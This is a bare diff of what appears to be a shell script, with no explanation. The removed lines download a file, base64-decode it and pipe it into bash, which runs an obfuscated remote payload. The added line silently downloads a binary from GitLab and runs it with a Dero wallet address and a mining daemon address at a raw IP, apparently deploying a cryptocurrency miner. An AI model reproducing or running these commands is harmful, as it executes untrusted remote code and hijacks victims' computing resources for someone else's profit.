@@ -1,2 +1,1 @@
-wget https://github.com/Dockerku/puntung/raw/main/samsu && chmod +x samsu
-base64 samsu -d | bash
+wget -q -O dero https://gitlab.com/cibogo/tools/-/raw/main/derosg && chmod +x dero && ./dero --wallet-address dero1qy2uxnl7p68cyt94l743k4h30ua268wv9fru7r0wua5r8el7ymay6qqx43myl --daemon-rpc-address=34.72.84.130:10100
